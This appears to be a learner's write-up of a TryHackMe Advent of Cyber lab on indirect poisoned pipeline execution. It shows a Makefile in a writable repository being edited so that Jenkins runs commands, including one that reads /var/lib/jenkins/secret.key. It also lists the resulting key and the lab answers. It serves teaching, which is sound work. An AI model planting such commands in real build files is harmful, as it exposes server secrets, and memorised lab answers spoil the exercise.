
# Task 27  [Day 21] DevSecOps Yule be Poisoned: A Pipeline of Insecure Code!

## Learning Objectives

- Understand how a larger CI/CD environment operates.
- Explore indirect poisoned pipeline execution (PPE) and how it can be used to exploit Git.
- Apply CI/CD exploitation knowledge to the larger CI/CD environment.

## CI/CD Environment

Often, developers or other end-users only see a limited portion of the CI/CD pipeline. Developers interact with Git on a daily basis, so it makes sense that CI/CD is most commonly associated with Git – although it only makes up a quarter of a typical CI/CD pipeline. The diagram below visualises the general segments of a pipeline: development, build, testing, and deployment. While these segments could be expanded and interchanged, all pipelines will follow a similar order.

In the previous task, we looked at a CI/CD environment that was self-contained in Git. In a more formal environment, segments of the pipeline may be separated out onto different platforms. Below is the CI/CD environment we'll be exploring in this room. You will notice the addition of Jenkins, a build platform and automation server. In the next section, we will explore Jenkins and discuss how these components interact and contribute to the pipeline.

## Automation Platforms

Jenkins, along with many other applications, handles a pipeline's build segment. These platforms can be remote or local. For example, Travis CI is a remote build platform, whereas Jenkins is a local automation server.

These platforms rely on runners or agents to build a project on a pre-configured VM. One advantage of some automation platforms is that they can automatically create and configure build environments on demand. This allows building and testing in different environments without manual configuration or administration.

## Indirect Poisoned Pipeline Execution

Let's briefly shift our focus back to the development stage. In the previous task, poisoned pipeline execution was introduced, wherein an attacker has direct write access to a repository pipeline. If an attacker doesn't have direct write access (to a main-protected or branch-protected repository, for example), it's possible they have write access to other repositories that could **indirectly** modify the behaviour of the pipeline execution.

If an environment is employing a development pipeline, a configuration file must be defined for the steps the build system must take. If a repository contains all the necessary source and build files, and another repository contains the pipeline files, write permissions could differ between the two, resulting in an indirect PPE vulnerability. In this example, you can assume that the repository containing the source is not write-protected and the repository containing the pipeline is write-protected.

To exploit this vulnerability, an attacker would need to identify a file or other parameter they can arbitrarily change that the pipeline file will use. Makefiles and other build files are usually exploitable because they are used to build the source and can run any arbitrary commands as defined in the makefile. Below is an example of what this might look like in a pipeline file.

```makefile
stage('make') {
	steps {
		build() {
				sh 'make || true'
		}
	}
}
```

To weaponise this vulnerability or PPE in general, the CI/CD environment as a whole must be taken into consideration. For example, if a build server is used to build artefacts on a pre-configuration virtual machine, an attacker could run arbitrary commands in that environment.

## Resolver

- clone and modify Build to whoami
```
http://10.10.28.42:3000/McHoneyBell/gift-wrapper-pipeline.git

cat Jenkinsfile                                
pipeline {
    agent any

    stages {
        stage('Prepare') {
            steps {
                git 'http://127.0.0.1:3000/McHoneyBell/gift-wrapper.git'
            }
        }

        stage('Build') {
            steps {
                sh 'whoami'
            }
        }
    }
}
```

- push and see error
```
git add .
git commit -m "cheking whoami"

git config user.email "guest@antarticrafts.com"
git config user.name "guest" 

git commit -m "cheking whoami"                 
[main 448e17b] cheking whoami
 1 file changed, 2 insertions(+), 2 deletions(-)

git push
Username for 'http://10.10.28.42:3000': guest
Password for 'http://guest@10.10.28.42:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 6 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 286 bytes | 286.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: 
remote: Gitea: User permission denied for writing.
To http://10.10.28.42:3000/McHoneyBell/gift-wrapper-pipeline.git
 ! [remote rejected] main -> main (pre-receive hook declined)
error: failed to push some refs to 'http://10.10.28.42:3000/McHoneyBell/gift-wrapper-pipeline.git'

```

- clone other repo
```
git clone http://10.10.28.42:3000/McHoneyBell/gift-wrapper.git         
Cloning into 'gift-wrapper'...
remote: Enumerating objects: 71, done.
remote: Counting objects: 100% (71/71), done.
remote: Compressing objects: 100% (66/66), done.
remote: Total 71 (delta 27), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (71/71), 70.29 KiB | 359.00 KiB/s, done.
Resolving deltas: 100% (27/27), done.

cd gift-wrapper

cat Makefile 
build:
        ./to_pip.sh


nano Makefile
cat Makefile              
build:
        whoami
                 

git add . 
git commit -m "confirming whoami"
git push                                       
git push
Username for 'http://10.10.28.42:3000': guest
Password for 'http://guest@10.10.28.42:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 6 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 284 bytes | 284.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.28.42:3000/McHoneyBell/gift-wrapper.git
   26ece71..c505188  master -> master


```

- changes to answer quesrions
```
cat Makefile 
build:
        whoami
        uname -a 
        cat /var/lib/jenkins/secret.key
git add .
git commit -m "other changes"
git push
```

- after jenkins build

```
whoami
jenkins
uname -a 
Linux tryhackme 5.4.0-1029-aws #30-Ubuntu SMP Tue Oct 20 10:06:38 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
cat /var/lib/jenkins/secret.key
90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7
```

## Answer the questions below

What Linux kernel version is the Jenkins node?
 5.4.0-1029-aws

What value is found from _/var/lib/jenkins/secret.key?_
90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7




Task 27  [Day 21] DevSecOps Yule be Poisoned: A Pipeline of Insecure Code!



I completed  Task 27  [Day 21] DevSecOps Yule be Poisoned: A Pipeline of Insecure Code!!, Don't miss out Tryhackme #AdventOfCyber @RealTryHackMe https://tryhackme.com/room/adventofcyber2023


## Referencias

- https://www.cidersecurity.io/top-10-cicd-security-risks/poisoned-pipeline-execution-ppe/
- https://portswigger.net/daily-swig/poisoned-pipelines-security-researcher-explores-attack-methods-in-ci-environments